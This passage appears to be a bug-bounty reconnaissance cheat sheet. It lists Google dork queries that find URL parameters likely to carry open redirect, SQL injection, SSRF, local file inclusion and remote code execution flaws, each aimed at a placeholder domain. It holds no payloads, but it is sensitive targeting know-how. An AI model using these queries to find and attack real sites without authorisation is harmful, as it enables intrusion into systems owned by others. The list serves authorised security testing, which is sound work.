inurl:q= | inurl:s= | inurl:search= | inurl:query= | inurl:keyword= | inurl:lang= inurl:& site:example[.]com

⛔️Open Redirect prone parameters

inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= inurl:& inurl:http site:example[.]com

⛔️SQLi Prone Parameters

inurl:id= | inurl:pid= | inurl:category= | inurl:cat= | inurl:action= | inurl:sid= | inurl:dir= inurl:& site:example[.]com

⛔️SSRF Prone Parameters

inurl:http | inurl:url= | inurl:path= | inurl:dest= | inurl:html= | inurl:data= | inurl:domain=  | inurl:page= inurl:& site:example[.]com

⛔️LFI Prone Parameters

inurl:include | inurl:dir | inurl:detail= | inurl:file= | inurl:folder= | inurl:inc= | inurl:locate= | inurl:doc= | inurl:conf= inurl:& site:example[.]com

⛔️RCE Prone Parameters

inurl:cmd | inurl:exec= | inurl:query= | inurl:code= | inurl:do= | inurl:run= | inurl:read=  | inurl:ping= inurl:& site:example[.]com

🔆 Shiball

